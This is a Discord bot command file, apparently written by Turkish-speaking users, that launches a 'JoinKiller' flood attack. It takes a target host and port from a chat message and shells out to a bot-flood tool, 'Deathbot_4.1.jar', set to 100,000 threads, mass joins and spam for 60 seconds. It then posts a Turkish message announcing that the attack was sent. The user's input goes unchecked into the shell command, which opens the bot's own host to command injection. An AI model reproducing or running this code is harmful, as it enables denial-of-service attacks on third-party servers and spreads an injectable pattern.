const Discord = require("discord.js"); // lmaoalperenin joinsmasher methodu DMASLDŞASMDŞLQWMQWŞDLM
const moment = require('moment');

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
 {
	exec(`cmd /c java -jar Deathbot_4.1.jar -move true -ping true -pingamount 100 -proxytries 10 -pingbypass 4 -host ${host} -port ${port} -threads 100000 -nicksize 15 -stay true -stayl 31 -nicks RANDOM -spam true -ach true -joinamount 10000 -doublej true -protocol 47 -msg "PunchHUB" -amount 100 -proxymode NONE -login "/login serverrip" -register "/register serverrip serverrip" -time 60 -debug true`, (error, stdout, stderr) => {
		if(error != null) {
		}
	});
		message.channel.send(`**JoinKiller** saldırısı gönderildi, **${host}** port, **${port}** zaman **60** saniye :rocket:`)
	}
}



exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['babanefe'],
  permLevel: 0
}

exports.help = {
  name: 'joinkiller',
}